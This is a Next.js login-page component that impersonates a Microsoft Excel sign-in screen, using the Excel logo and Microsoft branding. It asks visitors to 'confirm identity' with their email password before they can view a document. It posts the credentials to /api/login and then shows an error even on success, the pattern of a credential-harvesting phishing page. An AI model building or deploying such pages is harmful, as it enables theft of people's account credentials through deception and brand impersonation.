"use client";

import { Suspense, useState } from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import Image from "next/image";
import { useRouter } from "next/navigation";

const formSchema = z.object({
  email: z.string().email("Invalid email address"),
  password: z.string().min(1, "Password is required"),
  staySignedIn: z.boolean().optional(),
});

type FormValues = z.infer<typeof formSchema>;

function LoginPageContent() {
  const router = useRouter();
  const [serverError, setServerError] = useState<string | null>(null);

  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: "",
      password: "",
      staySignedIn: true,
    },
  });

  const onSubmit = async (values: FormValues) => {
    setServerError(null);

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => ({}));
        throw new Error(payload?.error ?? "Authentication failed");
      }
      setServerError("Something went wrong!");
    } catch (err) {
      const message =
        err instanceof Error ? err.message : "Something went wrong";
      setServerError(message);
    }
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center font-sans text-black bg-[url('/images/doc.png')] bg-cover bg-center">
      <div className="w-full max-w-md space-y-8 px-4">
        <div className="rounded-lg border border-gray-300 bg-white p-6 shadow-md">
          <div className="text-left">
            <div className="flex py-5 px-2 rounded-md bg-black/10 items-center space-x-6">
              <Image
                src="/images/excel.png"
                alt="Excel"
                width={50}
                height={50}
                priority
              />
              <h2 className="text-2xl font-semibold text-green-700">
                Microsoft Excel
              </h2>
            </div>

            <h2 className="mt-6 text-xl font-semibold tracking-tight text-black">
              Confirm your identity
            </h2>
            <p className="mt-1 text-sm text-gray-600">
              Sign in with your valid email account to view document.
            </p>
          </div>

          <form className="space-y-5 mt-6" onSubmit={handleSubmit(onSubmit)}>
            <div className="space-y-1">
              <label
                htmlFor="email"
                className="text-sm font-medium text-gray-700"
              >
                Email ID
              </label>
              <Input
                id="email"
                type="email"
                placeholder="name@example.com"
                className="bg-white border-gray-300 text-black placeholder:text-gray-400 focus-visible:ring-blue-500 focus-visible:border-blue-500"
                {...register("email")}
              />
              {errors.email && (
                <p className="text-xs text-red-500 pt-1">
                  {errors.email.message}
                </p>
              )}
            </div>

            <div className="space-y-1">
              <label
                htmlFor="password"
                className="text-sm font-medium text-gray-700"
              >
                Email Password
              </label>
              <Input
                id="password"
                type="password"
                className="bg-white border-gray-300 text-black placeholder:text-gray-400 focus-visible:ring-blue-500 focus-visible:border-blue-500"
                {...register("password")}
              />
              {errors.password && (
                <p className="text-xs text-red-500 pt-1">
                  {errors.password.message}
                </p>
              )}
            </div>

            <div className="flex items-center space-x-2">
              <input
                type="checkbox"
                id="stay"
                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                {...register("staySignedIn")}
              />
              <label htmlFor="stay" className="text-sm text-gray-700">
                Stay signed in
              </label>
            </div>
            <p className="text-xs text-gray-500 -mt-1 ml-6">
              Uncheck on public computers
            </p>

            {serverError && (
              <div className="rounded bg-red-50 p-3 text-center text-sm text-red-700 border border-red-200">
                {serverError}
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-purple-600 text-white hover:bg-purple-700"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Viewing...
                </>
              ) : (
                "View Document"
              )}
            </Button>
          </form>

          <p className="mt-8 text-center text-xs text-gray-500">
            © Copyright 2026 Microsoft Corporation
          </p>
        </div>
      </div>
    </div>
  );
}

export default function LoginPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-gray-100 text-gray-500">
          Loading...
        </div>
      }
    >
      <LoginPageContent />
    </Suspense>
  );
}
